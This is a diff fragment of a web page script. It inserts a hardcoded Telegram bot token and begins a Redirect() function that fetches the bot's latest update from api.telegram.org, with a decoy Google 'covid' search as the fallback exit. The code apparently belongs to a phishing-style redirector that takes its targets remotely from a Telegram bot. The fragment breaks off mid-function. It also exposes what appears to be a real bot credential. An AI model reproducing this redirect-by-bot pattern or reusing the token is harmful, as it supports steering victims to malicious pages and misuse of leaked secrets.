@@ -1,6 +1,6 @@
 <script language="javascript">
 
-var BotToken = "";
+var BotToken = "7168954953:AAH1u_5kPi4WBdNXMix9OF8vxX0ACrKWLRI";
 var Exit = "https://www.google.com/search?q=covid";
 function Redirect() {
   fetch("https://api.telegram.org/bot" + BotToken + "/getUpdates?limit=1&offset=-1").then(marilia => {
